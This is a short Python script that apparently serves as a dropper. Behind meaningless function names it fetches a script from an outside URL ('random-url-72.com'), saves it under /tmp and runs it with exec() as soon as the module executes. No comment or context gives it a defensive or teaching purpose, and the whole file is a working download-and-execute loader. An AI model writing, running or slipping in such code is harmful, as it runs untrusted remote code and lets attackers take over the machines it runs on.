import requests
import os

def x(url):
    return requests.get(url).text

def y(path, data):
    with open(path, "w") as f:
        f.write(data)

def z(path):
    with open(path, "r") as f:
        return f.read()

def w(s):
    try:
        exec(s)
    except Exception as e:
        print(e)

def run(url, path):
    script = x(url)
    y(path, script)

    s = z(path)
    w(s)

def main():
    random_url = "http://random-url-72.com/script.py"
    local_file = "/tmp/script72.py"

    run(random_url, local_file)

main()
